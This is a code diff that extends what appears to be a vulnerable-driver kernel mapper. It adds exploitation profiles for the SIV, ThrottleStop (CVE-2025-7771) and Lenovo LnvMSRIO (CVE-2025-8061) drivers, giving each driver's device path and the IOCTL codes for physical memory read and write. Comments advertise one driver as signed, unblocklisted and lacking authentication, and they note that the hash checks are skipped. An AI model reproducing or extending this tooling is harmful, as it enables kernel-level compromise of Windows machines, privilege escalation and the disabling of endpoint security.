@@ -42,6 +42,9 @@ class DriverType(Enum):
     DELL_WDT = auto()
     CORSAIR_LL = auto()
     GIGABYTE_GIO = auto()
+    SIV_SIVX64 = auto()
+    THROTTLESTOP_TS = auto()
+    LENOVO_LNVMSRIO = auto()
     CUSTOM = auto()
 
 @dataclass
@@ -141,6 +144,39 @@ DRIVER_PROFILES: dict[str, DriverProfile] = {
         ioctl_read=0xC3502004,   # Ring0 memcpy physical read
         ioctl_write=0xC3502008,  # Ring0 memcpy physical write
     ),
+    # ---- Wave 1 (2026): SIV monitor (WHQL, unblocklisted, raw-cmd BULK) ----
+    # No auth on \\.\SIVDRIVER. Binary NOT shipped -- drop SIVX64.sys next to
+    # the mapper or use drivers/byo/sivx64.json. Hash check skipped until a
+    # pinned hash is recorded (use driver_test + force to enroll your copy).
+    "siv": DriverProfile(
+        driver_type=DriverType.SIV_SIVX64,
+        filename="SIVX64.sys",
+        service_name="SIVDRIVER",
+        device_path=r"\\.\SIVDRIVER",
+        known_hashes=[],
+        ioctl_read=0x10,   # Scatter read (raw cmd, NOT CTL_CODE)
+        ioctl_write=0x14,  # Map+write (raw cmd, flags bit1 = write-enable)
+    ),
+    # ---- Wave 1: ThrottleStop 3.0.0.0 (CVE-2025-7771, QWORD loop) ----
+    "throttlestop": DriverProfile(
+        driver_type=DriverType.THROTTLESTOP_TS,
+        filename="ThrottleStop.sys",
+        service_name="ThrottleStop",
+        device_path=r"\\.\ThrottleStop",
+        known_hashes=[],
+        ioctl_read=0x80006498,
+        ioctl_write=0x8000649C,
+    ),
+    # ---- Wave 1: Lenovo Dispatcher 3.0/3.1 (CVE-2025-8061, struct R/W) ----
+    "lenovo": DriverProfile(
+        driver_type=DriverType.LENOVO_LNVMSRIO,
+        filename="LnvMSRIO.sys",
+        service_name="LnvMSRIO",
+        device_path=r"\\.\WinMsrDev",
+        known_hashes=[],
+        ioctl_read=0x9C406104,
+        ioctl_write=0x9C40A108,
+    ),
 }
 
 def _parse_ioctl(v):
@@ -228,6 +264,11 @@ def _load_byo_profiles():
                         "corsair": DriverType.CORSAIR_LL,
                         "gigabyte": DriverType.GIGABYTE_GIO,
                         "gio": DriverType.GIGABYTE_GIO,
+                        "siv": DriverType.SIV_SIVX64,
+                        "sivx64": DriverType.SIV_SIVX64,
+                        "throttlestop": DriverType.THROTTLESTOP_TS,
+                        "lenovo": DriverType.LENOVO_LNVMSRIO,
+                        "lnvmsrio": DriverType.LENOVO_LNVMSRIO,
                         "custom": DriverType.CUSTOM,
                         "generic_bulk": DriverType.CUSTOM,
                         "generic_dword": DriverType.CUSTOM,
@@ -284,7 +325,7 @@ def _load_byo_profiles():
                     service = p.get("service_name") or key
                     device = p.get("device_path") or f"\\\\.\\{service}"
                     strategy = str(p.get("strategy") or "generic_bulk").lower()
-                    strat_map = {"intel": DriverType.INTEL_NAL, "msi": DriverType.MSI_RTCORE, "wdt": DriverType.DELL_WDT, "corsair": DriverType.CORSAIR_LL, "gigabyte": DriverType.GIGABYTE_GIO, "generic_bulk": DriverType.CUSTOM, "generic_dword": DriverType.CUSTOM, "custom": DriverType.CUSTOM}
+                    strat_map = {"intel": DriverType.INTEL_NAL, "msi": DriverType.MSI_RTCORE, "wdt": DriverType.DELL_WDT, "corsair": DriverType.CORSAIR_LL, "gigabyte": DriverType.GIGABYTE_GIO, "siv": DriverType.SIV_SIVX64, "sivx64": DriverType.SIV_SIVX64, "throttlestop": DriverType.THROTTLESTOP_TS, "lenovo": DriverType.LENOVO_LNVMSRIO, "lnvmsrio": DriverType.LENOVO_LNVMSRIO, "generic_bulk": DriverType.CUSTOM, "generic_dword": DriverType.CUSTOM, "custom": DriverType.CUSTOM}
                     dtype = strat_map.get(strategy, DriverType.CUSTOM)
                     known = p.get("known_hashes") or p.get("sha256") or []
                     if isinstance(known, str): known = [known]
